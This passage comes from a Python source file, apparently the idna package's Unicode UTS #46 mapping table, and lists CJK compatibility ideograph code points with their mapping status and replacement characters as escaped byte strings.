\'\xe5\x8d\x89\'),\n    (0x2F82D, \'M\', \'\xe5\x8d\x91\'),\n    (0x2F82E, \'M\', \'\xe5\x8d\x9a\'),\n    (0x2F82F, \'M\', \'\xe5\x8d\xb3\'),\n    (0x2F830, \'M\', \'\xe5\x8d\xbd\'),\n    (0x2F831, \'M\', \'\xe5\x8d\xbf\'),\n    (0x2F834, \'M\', \'\xf0\xa0\xa8\xac\'),\n    (0x2F835, \'M\', \'\xe7\x81\xb0\'),\n    (0x2F836, \'M\', \'\xe5\x8f\x8a\'),\n    (0x2F837, \'M\', \'\xe5\x8f\x9f\'),\n    (0x2F838, \'M\', \'\xf0\xa0\xad\xa3\'),\n    (0x2F839, \'M\', \'\xe5\x8f\xab\'),\n    (0x2F83A, \'M\', \'\xe5\x8f\xb1\'),\n    (0x2F83B, \'M\', \'\xe5\x90\x86\'),\n    (0x2F83C, \'M\', \'\xe5\x92\x9e\'),\n    (0x2F83D, \'M\', \'\xe5\x90\xb8\'),\n    (0x2F83E, \'M\', \'\xe5\x91\x88\'),\n    (0x2F83F, \'M\', \'\xe5\x91\xa8\'),\n    (0x2F840, \'M\', \'\xe5\x92\xa2\'),\n    (0x2F841, \'M\', \'\xe5\x93\xb6\'),\n    (0x2F842, \'M\', \'\xe5\x94\x90\'),\n    (0x2F843, \'M\', \'\xe5\x95\x93\'),\n    (0x2F844, \'M\', \'\xe5\x95\xa3\'),\n    (0x2F845, \'M\', \'\xe5\x96\x84\'),\n    (0x2F847, \'M\', \'\xe5\x96\x99\'),\n    (0x2F848, \'M\', \'\xe5\x96\xab\'),\n    (0x2F849, \'M\', \'\xe5\x96\xb3\'),\n    (0x2F84A, \'M\', \'\xe5\x97\x82\'),\n    (0x2F84B, \'M\', \'\xe5\x9c\x96\'),\n    (0x2F84C, \'M\', \'\xe5\x98\x86\'),\n    (0x2F84D, \'M\', \'\xe5\x9c\x97\'),\n    (0x2F84E, \'M\', \'\xe5\x99\x91\'),\n    (0x2F84F, \'M\', \'\xe5\x99\xb4\'),\n    (0x2F850, \'M\', \'\xe5\x88\x87\'),\n    (0x2F851, \'M\', \'\xe5\xa3\xae\'),\n    (0x2F852, \'M\', \'\xe5\x9f\x8e\'),\n    (0x2F853, \'M\', \'\xe5\x9f\xb4\'),\n    (0x2F854, \'M\', \'\xe5\xa0\x8d\'),\n    (0x2F855, \'M\', \'\xe5\x9e\x8b\'),\n    (0x2F856, \'M\', \'\xe5\xa0\xb2\'),\n    (0x2F857, \'M\', \'\xe5\xa0\xb1\'),\n    (0x2F858, \'M\', \'\xe5\xa2\xac\'),\n    (0x2F859, \'M\', \'\xf0\xa1\x93\xa4\'),\n    (0x2F85A, \'M\', \'\xe5\xa3\xb2\'),\n    (0x2F85B, \'M\', \'\xe5\xa3\xb7\'),\n    (0x2F85C, \'M\', \'\xe5\xa4\x86\'),\n    (0x2F85D, \'M\', \'\xe5\xa4\x9a\'),\n    (0x2F85E, \'M\', \'\xe5\xa4\xa2\'),\n    (0x2F85F, \'M\', \'\xe5\xa5\xa2\'),\n    (0x2F860, \'M\', \'\xf0\xa1\x9a\xa8\'),\n    (0x2F861, \'M\', \'\xf0\xa1\x9b\xaa\'),\n    (0x2F862, \'M\', \'\xe5\xa7\xac\'),\n    (0x2F863, \'M\', \'\xe5\xa8\x9b\'),\n    (0x2F864, \'M\', \'\xe5\xa8\xa7\'),\n    (0x2F865, \'M\', \'\xe5\xa7\x98\'),\n    (0x2F866, \'M\', \'\xe5\xa9\xa6\'),\n    (0x2F867, \'M\', \'\xe3\x9b\xae\'),\n    (0x2F868, \'X\'),\n    (0x2F869, \'M\', \'\xe5\xac\x88\'),\n    (0x2F86A, \'M\', \'\xe5\xac\xbe\'),\n    (0x2F86C, \'M\', \'\xf0\xa1\xa7\x88\'),\n    (0x2F86D, \'M\', \'\xe5\xaf\x83\'),\n    (0x2F86E, \'M\', \'\xe5\xaf\x98\'),\n    (0x2F86F, \'M\', \'\xe5\xaf\xa7\'),\n    (0x2F870, \'M\', \'\xe5\xaf\xb3\'),\n    (0x2F871, \'M\', \'\xf0\xa1\xac\x98\'),\n    (0x2F872, \'M\', \'\xe5\xaf\xbf\'),\n    (0x2F873, \'M\', \'\xe5\xb0\x86\'),\n    (0x2F874, \'X\'),\n    (0x2F875, \'M\', \'\xe5\xb0\xa2\'),\n    (0x2F876, \'M\', \'\xe3\x9e\x81\'),\n    (0x2F877, \'M\', \'\xe5\xb1\xa0\'),\n    (0x2F878, \'M\', \'\xe5\xb1\xae\'),\n    (0x2F879, \'M\', \'\xe5\xb3\x80\'),\n    (0x2F87A, \'M\', \'\xe5\xb2\x8d\'),\n    (0x2F87B, \'M\', \'\xf0\xa1\xb7\xa4\'),\n    (0x2F87C, \'M\', \'\xe5\xb5\x83\'),\n    (0x2F87D, \'M\', \'\xf0\xa1\xb7\xa6\'),\n    (0x2F87E, \'M\', \'\xe5\xb5\xae\'),\n    (0x2F87F, \'M\', \'\xe5\xb5\xab\'),\n    (0x2F880, \'M\', \'\xe5\xb5\xbc\'),\n    (0x2F881, \'M\', \'\xe5\xb7\xa1\'),\n    (0x2F882, \'M\', \'\xe5\xb7\xa2\'),\n    (0x2F883, \'M\', \'\xe3\xa0\xaf\'),\n    (0x2F884, \'M\', \'\xe5\xb7\xbd\'),\n    (0x2F885, \'M\', \'\xe5\xb8\xa8\'),\n    (0x2F886, \'M\', \'\xe5\xb8\xbd\'),\n    (0x2F887, \'M\', \'\xe5\xb9\xa9\'),\n    (0x2F888, \'M\', \'\xe3\xa1\xa2\'),\n    (0x2F889, \'M\', \'\xf0\xa2\x86\x83\'),\n    (0x2F88A, \'M\', \'\xe3\xa1\xbc\'),\n    (0x2F88B, \'M\', \'\xe5\xba\xb0\'),\n    (0x2F88C, \'M\', \'\xe5\xba\xb3\'),\n    (0x2F88D, \'M\', \'\xe5\xba\xb6\'),\n    (0x2F88E, \'M\', \'\xe5\xbb\x8a\'),\n    (0x2F88F, \'M\', \'\xf0\xaa\x8e\x92\'),\n    (0x2F890, \'M\', \'\xe5\xbb\xbe\'),\n    (0x2F891, \'M\', \'\xf0\xa2\x8c\xb1\'),\n    ]\n\ndef _seg_77() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x2F893, \'M\', \'\xe8\x88\x81\'),\n    (0x2F894, \'M\', \'\xe5\xbc\xa2\'),\n    (0x2F896, \'M\', \'\xe3\xa3\x87\'),\n    (0x2F897, \'M\', \'\xf0\xa3\x8a\xb8\'),\n    (0x2F898, \'M\', \'\xf0\xa6\x87\x9a\'),\n    (0x2F899, \'M\', \'\xe5\xbd\xa2\'),\n    (0x2F89A, \'M\', \'\xe5\xbd\xab\'),\n    (0x2F89B, \'M\', \'\xe3\xa3\xa3\'),\n    (0x2F89C, \'M\', \'\xe5\xbe\x9a\'),\n    (0x2F89D, \'M\', \'\xe5\xbf\x8d\'),\n    (0x2F89E, \'M\', \'\xe5\xbf\x97\'),\n    (0x2F89F, \'M\', \'\xe5\xbf\xb9\'),\n    (0x2F8A0, \'M\', \'\xe6\x82\x81\'),\n    (0x2F8A1, \'M\', \'\xe3\xa4\xba\'),\n    (0x2F8A2, \'M\', \'\xe3\xa4\x9c\'),\n    (0x2F8A3, \'M\', \'\xe6\x82\x94\'),\n    (0x2F8A4, \'M\', \'\xf0\xa2\x9b\x94\'),\n    (0x2F8A5, \'M\', \'\xe6\x83\x87\'),\n    (0x2F8A6, \'M\', \'\xe6\x85\x88\'),\n    (0x2F8A7, \'M\', \'\xe6\x85\x8c\'),\n    (0x2F8A8, \'M\', \'\xe6\x85\x8e\'),\n    (0x2F8A9, \'M\', \'\xe6\x85\x8c\'),\n    (0x2F8AA, \'M\', \'\xe6\x85\xba\'),\n    (0x2F8AB, \'M\', \'\xe6\x86\x8e\'),\n    (0x2F8AC, \'M\', \'\xe6\x86\xb2\'),\n    (0x2F8AD, \'M\', \'\xe6\x86\xa4\'),\n    (0x2F8AE, \'M\', \'\xe6\x86\xaf\'),\n    (0x2F8AF, \'M\', \'\xe6\x87\x9e\'),\n    (0x2F8B0, \'M\', \'\xe6\x87\xb2\'),\n    (0x2F8B1, \'M\', \'\xe6\x87\xb6\'),\n    (0x2F8B2, \'M\', \'\xe6\x88\x90\'),\n    (0x2F8B3, \'M\', \'\xe6\x88\x9b\'),\n    (0x2F8B4, \'M\', \'\xe6\x89\x9d\'),\n    (0x2F8B5, \'M\', \'\xe6\x8a\xb1\'),\n    (0x2F8B6, \'M\', \'\xe6\x8b\x94\'),\n    (0x2F8B7, \'M\', \'\xe6\x8d\x90\'),\n    (0x2F8B8, \'M\', \'\xf0\xa2\xac\x8c\'),\n    (0x2F8B9, \'M\', \'\xe6\x8c\xbd\'),\n    (0x2F8BA, \'M\', \'\xe6\x8b\xbc\'),\n    (0x2F8BB, \'M\', \'\xe6\x8d\xa8\'),\n    (0x2F8BC, \'M\', \'\xe6\x8e\x83\'),\n    (0x2F8BD, \'M\', \'\xe6\x8f\xa4\'),\n    (0x2F8BE, \'M\', \'\xf0\xa2\xaf\xb1\'),\n    (0x2F8BF, \'M\', \'\xe6\x90\xa2\'),\n    (0x2F8C0, \'M\', \'\xe6\x8f\x85\'),\n    (0x2F8C1, \'M\', \'\xe6\x8e\xa9\'),\n    (0x2F8C2, \'M\', \'\xe3\xa8\xae\'),\n    (0x2F8C3, \'M\', \'\xe6\x91\xa9\'),\n    (0x2F8C4, \'M\', \'\xe6\x91\xbe\'),\n    (0x2F8C5, \'M\', \'\xe6\x92\x9d\'),\n    (0x2F8C6, \'M\', \'\xe6\x91\xb7\'),\n    (0x2F8C7, \'M\', \'\xe3\xa9\xac\'),\n    (0x2F8C8, \'M\', \'\xe6\x95\x8f\'),\n    (0x2F8C9, \'M\', \'\xe6\x95\xac\'),\n    (0x2F8CA, \'M\', \'\xf0\xa3\x80\x8a\'),\n    (0x2F8CB, \'M\', \'\xe6\x97\xa3\'),\n    (0x2F8CC, \'M\', \'\xe6\x9b\xb8\'),\n    (0x2F8CD, \'M\', \'\xe6\x99\x89\'),\n    (0x2F8CE, \'M\', \'\xe3\xac\x99\'),\n    (0x2F8CF, \'M\', \'\xe6\x9a\x91\'),\n    (0x2F8D0, \'M\', \'\xe3\xac\x88\'),\n    (0x2F8D1, \'M\', \'\xe3\xab\xa4\'),\n    (0x2F8D2, \'M\', \'\xe5\x86\x92\'),\n    (0x2F8D3, \'M\', \'\xe5\x86\x95\'),\n    (0x2F8D4, \'M\', \'\xe6\x9c\x80\'),\n    (0x2F8D5, \'M\', \'\xe6\x9a\x9c\'),\n    (0x2F8D6, \'M\', \'\xe8\x82\xad\'),\n    (0x2F8D7, \'M\', \'\xe4\x8f\x99\'),\n    (0x2F8D8, \'M\', \'\xe6\x9c\x97\'),\n    (0x2F8D9, \'M\', \'\xe6\x9c\x9b\'),\n    (0x2F8DA, \'M\', \'\xe6\x9c\xa1\'),\n    (0x2F8DB, \'M\', \'\xe6\x9d\x9e\'),\n    (0x2F8DC, \'M\', \'\xe6\x9d\x93\'),\n    (0x2F8DD, \'M\', \'\xf0\xa3\x8f\x83\'),\n    (0x2F8DE, \'M\', \'\xe3\xad\x89\'),\n    (0x2F8DF, \'M\', \'\xe6\x9f\xba\'),\n    (0x2F8E0, \'M\', \'\xe6\x9e\x85\'),\n    (0x2F8E1, \'M\', \'\xe6\xa1\x92\'),\n    (0x2F8E2, \'M\', \'\xe6\xa2\x85\'),\n    (0x2F8E3, \'M\', \'\xf0\xa3\x91\xad\'),\n    (0x2F8E4, \'M\', \'\xe6\xa2\x8e\'),\n    (0x2F8E5, \'M\', \'\xe6\xa0\x9f\'),\n    (0x2F8E6, \'M\', \'\xe6\xa4\x94\'),\n    (0x2F8E7, \'M\', \'\xe3\xae\x9d\'),\n    (0x2F8E8, \'M\', \'\xe6\xa5\x82\'),\n    (0x2F8E9, \'M\', \'\xe6\xa6\xa3\'),\n    (0x2F8EA, \'M\', \'\xe6\xa7\xaa\'),\n    (0x2F8EB, \'M\', \'\xe6\xaa\xa8\'),\n    (0x2F8EC, \'M\', \'\xf0\xa3\x9a\xa3\'),\n    (0x2F8ED, \'M\', \'\xe6\xab\x9b\'),\n    (0x2F8EE, \'M\', \'\xe3\xb0\x98\'),\n    (0x2F8EF, \'M\', \'\xe6\xac\xa1\'),\n    (0x2F8F0, \'M\', \'\xf0\xa3\xa2\xa7\'),\n    (0x2F8F1, \'M\', \'\xe6\xad\x94\'),\n    (0x2F8F2, \'M\', \'\xe3\xb1\x8e\'),\n    (0x2F8F3, \'M\', \'\xe6\xad\xb2\'),\n    (0x2F8F4, \'M\', \'\xe6\xae\x9f\'),\n    (0x2F8F5, \'M\', \'\xe6\xae\xba\'),\n    (0x2F8F6, \'M\', \'\xe6\xae\xbb\'),\n    (0x2F8F7, \'M\', \'\xf0\xa3\xaa\x8d\'),\n    ]\n\ndef _seg_78() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x2F8F8, \'M\', \'\xf0\xa1\xb4\x8b\'),\n    (0x2F8F9, \'M\', \'\xf0\xa3\xab\xba\'),\n    (0x2F8FA, \'M\', \'\xe6\xb1\x8e\'),\n    (0x2F8FB, \'M\', \'\xf0\xa3\xb2\xbc\'),\n    (0x2F8FC, \'M\', \'\xe6\xb2\xbf\'),\n    (0x2F8FD, \'M\', \'\xe6\xb3\x8d\'),\n    (0x2F8FE, \'M\', \'\xe6\xb1\xa7\'),\n    (0x2F8FF, \'M\', \'\xe6\xb4\x96\'),\n    (0x2F900, \'M\', \'\xe6\xb4\xbe\'),\n    (0x2F901, \'M\', \'\xe6\xb5\xb7\'),\n    (0x2F902, \'M\', \'\xe6\xb5\x81\'),\n    (0x2F903, \'M\', \'\xe6\xb5\xa9\'),\n    (0x2F904, \'M\', \'\xe6\xb5\xb8\'),\n    (0x2F905, \'M\', \'\xe6\xb6\x85\'),\n    (0x2F906, \'M\', \'\xf0\xa3\xb4\x9e\'),\n    (0x2F907, \'M\', \'\xe6\xb4\xb4\'),\n    (0x2F908, \'M\', \'\xe6\xb8\xaf\'),\n    (0x2F909, \'M\', \'\xe6\xb9\xae\'),\n    (0x2F90A, \'M\', \'\xe3\xb4\xb3\'),\n    (0x2F90B, \'M\', \'\xe6\xbb\x8b\'),\n    (0x2F90C, \'M\', \'\xe6\xbb\x87\'),\n    (0x2F90D, \'M\', \'\xf0\xa3\xbb\x91\'),\n    (0x2F90E, \'M\', \'\xe6\xb7\xb9\'),\n    (0x2F90F, \'M\', \'\xe6\xbd\xae\'),\n    (0x2F910, \'M\', \'\xf0\xa3\xbd\x9e\'),\n    (0x2F911, \'M\', \'\xf0\xa3\xbe\x8e\'),\n    (0x2F912, \'M\', \'\xe6\xbf\x86\'),\n    (0x2F913, \'M\', \'\xe7\x80\xb9\'),\n    (0x2F914, \'M\', \'\xe7\x80\x9e\'),\n    (0x2F915, \'M\', \'\xe7\x80\x9b\'),\n    (0x2F916, \'M\', \'\xe3\xb6\x96\'),\n    (0x2F917, \'M\', \'\xe7\x81\x8a\'),\n    (0x2F918, \'M\', \'\xe7\x81\xbd\'),\n    (0x2F919, \'M\', \'\xe7\x81\xb7\'),\n    (0x2F91A, \'M\', \'\xe7\x82\xad\'),\n    (0x2F91B, \'M\', \'\xf0\xa0\x94\xa5\'),\n    (0x2F91C, \'M\', \'\xe7\x85\x85\'),\n    (0x2F91D, \'M\', \'\xf0\xa4\x89\xa3\'),\n    (0x2F91E, \'M\', \'\xe7\x86\x9c\'),\n    (0x2F91F, \'X\'),\n    (0x2F920, \'M\', \'\xe7\x88\xa8\'),\n    (0x2F921, \'M\', \'\xe7\x88\xb5\'),\n    (0x2F922, \'M\', \'\xe7\x89\x90\'),\n    (0x2F923, \'M\', \'\xf0\xa4\x98\x88\'),\n    (0x2F924, \'M\', \'\xe7\x8a\x80\'),\n    (0x2F925, \'M\', \'\xe7\x8a\x95\'),\n    (0x2F926, \'M\', \'\xf0\xa4\x9c\xb5\'),\n    (0x2F927, \'M\', \'\xf0\xa4\xa0\x94\'),\n    (0x2F928, \'M\', \'\xe7\x8d\xba\'),\n    (0x2F929, \'M\', \'\xe7\x8e\x8b\'),\n    (0x2F92A, \'M\', \'\xe3\xba\xac\'),\n    (0x2F92B, \'M\', \'\xe7\x8e\xa5\'),\n    (0x2F92C, \'M\', \'\xe3\xba\xb8\'),\n    (0x2F92E, \'M\', \'\xe7\x91\x87\'),\n    (0x2F92F, \'M\', \'\xe7\x91\x9c\'),\n    (0x2F930, \'M\', \'\xe7\x91\xb1\'),\n    (0x2F931, \'M\', \'\xe7\x92\x85\'),\n    (0x2F932, \'M\', \'\xe7\x93\x8a\'),\n    (0x2F933, \'M\', \'\xe3\xbc\x9b\'),\n    (0x2F934, \'M\', \'\xe7\x94\xa4\'),\n    (0x2F935, \'M\', \'\xf0\xa4\xb0\xb6\'),\n    (0x2F936, \'M\', \'\xe7\x94\xbe\'),\n    (0x2F937, \'M\', \'\xf0\xa4\xb2\x92\'),\n    (0x2F938, \'M\', \'\xe7\x95\xb0\'),\n    (0x2F939, \'M\', \'\xf0\xa2\x86\x9f\'),\n    (0x2F93A, \'M\', \'\xe7\x98\x90\'),\n    (0x2F93B, \'M\', \'\xf0\xa4\xbe\xa1\'),\n    (0x2F93C, \'M\', \'\xf0\xa4\xbe\xb8\'),\n    (0x2F93D, \'M\', \'\xf0\xa5\x81\x84\'),\n    (0x2F93E, \'M\', \'\xe3\xbf\xbc\'),\n    (0x2F93F, \'M\', \'\xe4\x80\x88\'),\n    (0x2F940, \'M\', \'\xe7\x9b\xb4\'),\n    (0x2F941, \'M\', \'\xf0\xa5\x83\xb3\'),\n    (0x2F942, \'M\', \'\xf0\xa5\x83\xb2\'),\n    (0x2F943, \'M\', \'\xf0\xa5\x84\x99\'),\n    (0x2F944, \'M\', \'\xf0\xa5\x84\xb3\'),\n    (0x2F945, \'M\', \'\xe7\x9c\x9e\'),\n    (0x2F946, \'M\', \'\xe7\x9c\x9f\'),\n    (0x2F948, \'M\', \'\xe7\x9d\x8a\'),\n    (0x2F949, \'M\', \'\xe4\x80\xb9\'),\n    (0x2F94A, \'M\', \'\xe7\x9e\x8b\'),\n    (0x2F94B, \'M\', \'\xe4\x81\x86\'),\n    (0x2F94C, \'M\', \'\xe4\x82\x96\'),\n    (0x2F94D, \'M\', \'\xf0\xa5\x90\x9d\'),\n    (0x2F94E, \'M\', \'\xe7\xa1\x8e\'),\n    (0x2F94F, \'M\', \'\xe7\xa2\x8c\'),\n    (0x2F950, \'M\', \'\xe7\xa3\x8c\'),\n    (0x2F951, \'M\', \'\xe4\x83\xa3\'),\n    (0x2F952, \'M\', \'\xf0\xa5\x98\xa6\'),\n    (0x2F953, \'M\', \'\xe7\xa5\x96\'),\n    (0x2F954, \'M\', \'\xf0\xa5\x9a\x9a\'),\n    (0x2F955, \'M\', \'\xf0\xa5\x9b\x85\'),\n    (0x2F956, \'M\', \'\xe7\xa6\x8f\'),\n    (0x2F957, \'M\', \'\xe7\xa7\xab\'),\n    (0x2F958, \'M\', \'\xe4\x84\xaf\'),\n    (0x2F959, \'M\', \'\xe7\xa9\x80\'),\n    (0x2F95A, \'M\', \'\xe7\xa9\x8a\'),\n    (0x2F95B, \'M\', \'\xe7\xa9\x8f\'),\n    (0x2F95C, \'M\', \'\xf0\xa5\xa5\xbc\'),\n    (0x2F95D, \'M\', \'\xf0\xa5\xaa\xa7\'),\n    ]\n\ndef _seg_79() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x2F95F, \'X\'),\n    (0x2F960, \'M\', \'\xe4\x88\x82\'),\n    (0x2F961, \'M\', \'\xf0\xa5\xae\xab\'),\n    (0x2F962, \'M\', \'\xe7\xaf\x86\'),\n    (0x2F963, \'M\', \'\xe7\xaf\x89\'),\n    (0x2F964, \'M\', \'\xe4\x88\xa7\'),\n    (0x2F965, \'M\', \'\xf0\xa5\xb2\x80\'),\n    (0x2F966, \'M\', \'\xe7\xb3\x92\'),\n    (0x2F967, \'M\', \'\xe4\x8a\xa0\'),\n    (0x2F968, \'M\', \'\xe7\xb3\xa8\'),\n    (0x2F969, \'M\', \'\xe7\xb3\xa3\'),\n    (0x2F96A, \'M\', \'\xe7\xb4\x80\'),\n    (0x2F96B, \'M\', \'\xf0\xa5\xbe\x86\'),\n    (0x2F96C, \'M\', \'\xe7\xb5\xa3\'),\n    (0x2F96D, \'M\', \'\xe4\x8c\x81\'),\n    (0x2F96E, \'M\', \'\xe7\xb7\x87\'),\n    (0x2F96F, \'M\', \'\xe7\xb8\x82\'),\n    (0x2F970, \'M\', \'\xe7\xb9\x85\'),\n    (0x2F971, \'M\', \'\xe4\x8c\xb4\'),\n    (0x2F972, \'M\', \'\xf0\xa6\x88\xa8\'),\n    (0x2F973, \'M\', \'\xf0\xa6\x89\x87\'),\n    (0x2F974, \'M\', \'\xe4\x8d\x99\'),\n    (0x2F975, \'M\', \'\xf0\xa6\x8b\x99\'),\n    (0x2F976, \'M\', \'\xe7\xbd\xba\'),\n    (0x2F977, \'M\', \'\xf0\xa6\x8c\xbe\'),\n    (0x2F978, \'M\', \'\xe7\xbe\x95\'),\n    (0x2F979, \'M\', \'\xe7\xbf\xba\'),\n    (0x2F97A, \'M\', \'\xe8\x80\x85\'),\n    (0x2F97B, \'M\', \'\xf0\xa6\x93\x9a\'),\n    (0x2F97C, \'M\', \'\xf0\xa6\x94\xa3\'),\n    (0x2F97D, \'M\', \'\xe8\x81\xa0\'),\n    (0x2F97E, \'M\', \'\xf0\xa6\x96\xa8\'),\n    (0x2F97F, \'M\', \'\xe8\x81\xb0\'),\n    (0x2F980, \'M\', \'\xf0\xa3\x8d\x9f\'),\n    (0x2F981, \'M\', \'\xe4\x8f\x95\'),\n    (0x2F982, \'M\', \'\xe8\x82\xb2\'),\n    (0x2F983, \'M\', \'\xe8\x84\x83\'),\n    (0x2F984, \'M\', \'\xe4\x90\x8b\'),\n    (0x2F985, \'M\', \'\xe8\x84\xbe\'),\n    (0x2F986, \'M\', \'\xe5\xaa\xb5\'),\n    (0x2F987, \'M\', \'\xf0\xa6\x9e\xa7\'),\n    (0x2F988, \'M\', \'\xf0\xa6\x9e\xb5\'),\n    (0x2F989, \'M\', \'\xf0\xa3\x8e\x93\'),\n    (0x2F98A, \'M\', \'\xf0\xa3\x8e\x9c\'),\n    (0x2F98B, \'M\', \'\xe8\x88\x81\'),\n    (0x2F98C, \'M\', \'\xe8\x88\x84\'),\n    (0x2F98D, \'M\', \'\xe8\xbe\x9e\'),\n    (0x2F98E, \'M\', \'\xe4\x91\xab\'),\n    (0x2F98F, \'M\', \'\xe8\x8a\x91\'),\n    (0x2F990, \'M\', \'\xe8\x8a\x8b\'),\n    (0x2F991, \'M\', \'\xe8\x8a\x9d\'),\n    (0x2F992, \'M\', \'\xe5\x8a\xb3\'),\n    (0x2F993, \'M\', \'\xe8\x8a\xb1\'),\n    (0x2F994, \'M\', \'\xe8\x8a\xb3\'),\n    (0x2F995, \'M\', \'\xe8\x8a\xbd\'),\n    (0x2F996, \'M\', \'\xe8\x8b\xa6\'),\n    (0x2F997, \'M\', \'\xf0\xa6\xac\xbc\'),\n    (0x2F998, \'M\', \'\xe8\x8b\xa5\'),\n    (0x2F999, \'M\', \'\xe8\x8c\x9d\'),\n    (0x2F99A, \'M\', \'\xe8\x8d\xa3\'),\n    (0x2F99B, \'M\', \'\xe8\x8e\xad\'),\n    (0x2F99C, \'M\', \'\xe8\x8c\xa3\'),\n    (0x2F99D, \'M\', \'\xe8\x8e\xbd\'),\n    (0x2F99E, \'M\', \'\xe8\x8f\xa7\'),\n    (0x2F99F, \'M\', \'\xe8\x91\x97\'),\n    (0x2F9A0, \'M\', \'\xe8\x8d\x93\'),\n    (0x2F9A1, \'M\', \'\xe8\x8f\x8a\'),\n    (0x2F9A2, \'M\', \'\xe8\x8f\x8c\'),\n    (0x2F9A3, \'M\', \'\xe8\x8f\x9c\'),\n    (0x2F9A4, \'M\', \'\xf0\xa6\xb0\xb6\'),\n    (0x2F9A5, \'M\', \'\xf0\xa6\xb5\xab\'),\n    (0x2F9A6, \'M\', \'\xf0\xa6\xb3\x95\'),\n    (0x2F9A7, \'M\', \'\xe4\x94\xab\'),\n    (0x2F9A8, \'M\', \'\xe8\x93\xb1\'),\n    (0x2F9A9, \'M\', \'\xe8\x93\xb3\'),\n    (0x2F9AA, \'M\', \'\xe8\x94\x96\'),\n    (0x2F9AB, \'M\', \'\xf0\xa7\x8f\x8a\'),\n    (0x2F9AC, \'M\', \'\xe8\x95\xa4\'),\n    (0x2F9AD, \'M\', \'\xf0\xa6\xbc\xac\'),\n    (0x2F9AE, \'M\', \'\xe4\x95\x9d\'),\n    (0x2F9AF, \'M\', \'\xe4\x95\xa1\'),\n    (0x2F9B0, \'M\', \'\xf0\xa6\xbe\xb1\'),\n    (0x2F9B1, \'M\', \'\xf0\xa7\x83\x92\'),\n    (0x2F9B2, \'M\', \'\xe4\x95\xab\'),\n    (0x2F9B3, \'M\', \'\xe8\x99\x90\'),\n    (0x2F9B4, \'M\', \'\xe8\x99\x9c\'),\n    (0x2F9B5, \'M\', \'\xe8\x99\xa7\'),\n    (0x2F9B6, \'M\', \'\xe8\x99\xa9\'),\n    (0x2F9B7, \'M\', \'\xe8\x9a\xa9\'),\n    (0x2F9B8, \'M\', \'\xe8\x9a\x88\'),\n    (0x2F9B9, \'M\', \'\xe8\x9c\x8e\'),\n    (0x2F9BA, \'M\', \'\xe8\x9b\xa2\'),\n    (0x2F9BB, \'M\', \'\xe8\x9d\xb9\'),\n    (0x2F9BC, \'M\', \'\xe8\x9c\xa8\'),\n    (0x2F9BD, \'M\', \'\xe8\x9d\xab\'),\n    (0x2F9BE, \'M\', \'\xe8\x9e\x86\'),\n    (0x2F9BF, \'X\'),\n    (0x2F9C0, \'M\', \'\xe8\x9f\xa1\'),\n    (0x2F9C1, \'M\', \'\xe8\xa0\x81\'),\n    (0x2F9C2, \'M\', \'\xe4\x97\xb9\'),\n    ]\n\ndef _seg_80() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x2F9C3, \'M\', \'\xe8\xa1\xa0\'),\n    (0x2F9C4, \'M\', \'\xe8\xa1\xa3\'),\n    (0x2F9C5, \'M\', \'\xf0\xa7\x99\xa7\'),\n    (0x2F9C6, \'M\', \'\xe8\xa3\x97\'),\n    (0x2F9C7, \'M\', \'\xe8\xa3\x9e\'),\n    (0x2F9C8, \'M\', \'\xe4\x98\xb5\'),\n    (0x2F9C9, \'M\', \'\xe8\xa3\xba\'),\n    (0x2F9CA, \'M\', \'\xe3\x92\xbb\'),\n    (0x2F9CB, \'M\', \'\xf0\xa7\xa2\xae\'),\n    (0x2F9CC, \'M\', \'\xf0\xa7\xa5\xa6\'),\n    (0x2F9CD, \'M\', \'\xe4\x9a\xbe\'),\n    (0x2F9CE, \'M\', \'\xe4\x9b\x87\'),\n    (0x2F9CF, \'M\', \'\xe8\xaa\xa0\'),\n    (0x2F9D0, \'M\', \'\xe8\xab\xad\'),\n    (0x2F9D1, \'M\', \'\xe8\xae\x8a\'),\n    (0x2F9D2, \'M\', \'\xe8\xb1\x95\'),\n    (0x2F9D3, \'M\', \'\xf0\xa7\xb2\xa8\'),\n    (0x2F9D4, \'M\', \'\xe8\xb2\xab\'),\n    (0x2F9D5, \'M\', \'\xe8\xb3\x81\'),\n    (0x2F9D6, \'M\', \'\xe8\xb4\x9b\'),\n    (0x2F9D7, \'M\', \'\xe8\xb5\xb7\'),\n    (0x2F9D8, \'M\', \'\xf0\xa7\xbc\xaf\'),\n    (0x2F9D9, \'M\', \'\xf0\xa0\xa0\x84\'),\n    (0x2F9DA, \'M\', \'\xe8\xb7\x8b\'),\n    (0x2F9DB, \'M\', \'\xe8\xb6\xbc\'),\n    (0x2F9DC, \'M\', \'\xe8\xb7\xb0\'),\n    (0x2F9DD, \'M\', \'\xf0\xa0\xa3\x9e\'),\n    (0x2F9DE, \'M\', \'\xe8\xbb\x94\'),\n    (0x2F9DF, \'M\', \'\xe8\xbc\xb8\'),\n    (0x2F9E0, \'M\', \'\xf0\xa8\x97\x92\'),\n    (0x2F9E1, \'M\', \'\xf0\xa8\x97\xad\'),\n    (0x2F9E2, \'M\', \'\xe9\x82\x94\'),\n    (0x2F9E3, \'M\', \'\xe9\x83\xb1\'),\n    (0x2F9E4, \'M\', \'\xe9\x84\x91\'),\n    (0x2F9E5, \'M\', \'\xf0\xa8\x9c\xae\'),\n    (0x2F9E6, \'M\', \'\xe9\x84\x9b\'),\n    (0x2F9E7, \'M\', \'\xe9\x88\xb8\'),\n    (0x2F9E8, \'M\', \'\xe9\x8b\x97\'),\n    (0x2F9E9, \'M\', \'\xe9\x8b\x98\'),\n    (0x2F9EA, \'M\', \'\xe9\x89\xbc\'),\n    (0x2F9EB, \'M\', \'\xe9\x8f\xb9\'),\n    (0x2F9EC, \'M\', \'\xe9\x90\x95\'),\n    (0x2F9ED, \'M\', \'\xf0\xa8\xaf\xba\'),\n    (0x2F9EE, \'M\', \'\xe9\x96\x8b\'),\n    (0x2F9EF, \'M\', \'\xe4\xa6\x95\'),\n    (0x2F9F0, \'M\', \'\xe9\x96\xb7\'),\n    (0x2F9F1, \'M\', \'\xf0\xa8\xb5\xb7\'),\n    (0x2F9F2, \'M\', \'\xe4\xa7\xa6\'),\n    (0x2F9F3, \'M\', \'\xe9\x9b\x83\'),\n    (0x2F9F4, \'M\', \'\xe5\xb6\xb2\'),\n    (0x2F9F5, \'M\', \'\xe9\x9c\xa3\'),\n    (0x2F9F6, \'M\', \'\xf0\xa9\x85\x85\'),\n    (0x2F9F7, 